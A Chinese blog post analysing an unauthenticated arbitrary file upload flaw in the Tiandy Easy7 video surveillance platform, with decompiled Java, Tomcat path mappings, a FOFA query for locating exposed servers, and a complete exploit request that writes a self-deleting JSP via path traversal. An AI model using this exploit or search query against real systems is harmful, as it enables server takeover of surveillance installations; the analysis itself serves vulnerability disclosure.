---
title: "天地伟业Easy7 uploadCheckImg 文件上传漏洞"
source: https://mrxn.net/jswz/easy7-file-uploadCheckImg-rce.html
asset_dir: assets/天地伟业easy7-uploadcheckimg-文件上传漏洞
---

# 天地伟业Easy7 uploadCheckImg 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/11 08:23
- 291浏览
- [0评论](#comment)
- 58分钟阅读

深入探索

软件

REST

rest

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的[软件](#)系统。

漏洞修复方案

该系统的/Easy7/rest/file/uploadCheckImg接口存在前台的任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)接口，可构造请求包，上传webshell文件并保存在任意路径，从而控制服务器。漏洞利用难度极低，可在未登录的状态下直接发送恶意请求包造成利用，可能被蠕虫、黑客组织批量利用。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)接口 /Easy7/rest/file/uploadCheckImg 的对应方法`uploadCheckImg()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/uploadCheckImg"})
    public void uploadCheckImg(HttpServletRequest request, HttpServletResponse response, CLS_VO_File voFile) throws Exception {
        CLS_VO_Result result = new CLS_VO_Result();
        PrintWriter out = response.getWriter();
        String fileName = voFile.getFileName();
        if (fileName == null) {
            fileName = UUID.randomUUID().toString();
            voFile.setFileName(fileName);
        }

        boolean isMultipart = ServletFileUpload.isMultipartContent(request);
        if (!isMultipart) {
            result.setRet(-7);
            out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
        } else {
            FileItemFactory factory = new DiskFileItemFactory();
            ServletFileUpload upload = new ServletFileUpload(factory);
            List<FileItem> items = null;

            try {
                items = upload.parseRequest(request);
            } catch (FileUploadException e) {
                result.setRet(-7);
                out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
                e.printStackTrace();
                return;
            }

            if (items == null) {
                result.setRet(-7);
                out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
            } else {
                File realFilePath = new File(CLS_Inquest_Type.PATHIMAGE + voFile.getUploadPicturePath());
                if (!realFilePath.exists() && !realFilePath.isDirectory()) {
                    realFilePath.mkdirs();
                }

                String newPath = "";
                Long size = null;

                for(FileItem fileItem : items) {
                    size = fileItem.getSize();
                    if (!fileItem.isFormField()) {
                        newPath = CLS_Inquest_Type.PATHIMAGE + voFile.getUploadPicturePath() + fileName;
                        File file = new File(newPath);

                        try {
                            fileItem.write(file);
                        } catch (Exception e) {
                            result.setRet(-7);
                            out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
                            e.printStackTrace();
                            return;
                        }
                    }
                }

                voFile.setFileSize(size);
                result.setRet(0);
                result.setContent(voFile);
                out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
            }
        }
    }
```

首先通过`voFile.getFileName()`控制写入文件名，其次是判断是不是文件上传（Content-Type是不是`multipart/`开头）

[![天地伟业Easy7 uploadCheckImg 文件上传漏洞](images/img-001-b1e084803a2b.webp)](https://image.mrxn.net/67e504ef83764ee68388bec2e06f6969.webp)

接下来就是commons.fileupload的基本操作

计算机科学

```
FileItemFactory factory = new DiskFileItemFactory();
ServletFileUpload upload = new ServletFileUpload(factory);
try {
    items = upload.parseRequest(request);
```

关键的[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)保存处理操作如下

```
for(FileItem fileItem : items) {
    size = fileItem.getSize();
    if (!fileItem.isFormField()) {
        newPath = CLS_Inquest_Type.PATHIMAGE + voFile.getUploadPicturePath() + fileName;
        File file = new File(newPath);

        try {
            fileItem.write(file);
```

其中`CLS_Inquest_Type.PATHIMAGE`为配置文件`WEB-INF/classes/config.properties`里固定的`file_path_base_img`值，一般为`file_path_base_img=/root/srsPath/`；

再结合用户可控的`voFile.getUploadPicturePath()`来拼接成最终保存文件的路径，因此整个利用链就非常清晰了，文件类型（后缀）可控，文件名可控，文件路径可控，基于这些就可以上传任意文件到任意目录了。

计算机服务器

但是需要解决不同架构或者版本的tomcat版本不一致问题，我们通过阅读 tomcat 的 `server.xml`配置，其中有如下映射

```
<Context  path="/share" docBase="/root/srsPath"
          reloadable="true"
          workDir="/root/srsPath">
</Context>

<Context  path="/imagelive" docBase="/root/tiandy/data"
          reloadable="true"
          workDir="/root/tiandy/data">
</Context>
```

我们可以上传到这`/root/srsPath`和`/root/tiandy/data`两个文件夹，通过访问`ip:port/share` 或者 `ip:port/imagelive` 来访问我们上传的文件，从而达到[命令执行](https://mrxn.net/tag/rce)的目的，或者在权限足够的时候，可以上传到crontab定时任务目录进行利用。

黑客与破解

# 漏洞复现

```
POST /Easy7/rest/file/uploadCheckImg?fileName=x.jsp&uploadPicturePath=%2F..%2F..%2Froot%2FsrsPath%2F HTTP/1.1
Host: easy7.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

访问 `/share/x.jsp` 成功执行代码并删除自身

[![天地伟业Easy7 uploadCheckImg 文件上传漏洞](images/img-002-919220311feb.webp)](https://image.mrxn.net/dc1446954c794aaf88cf43983f8682ef.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
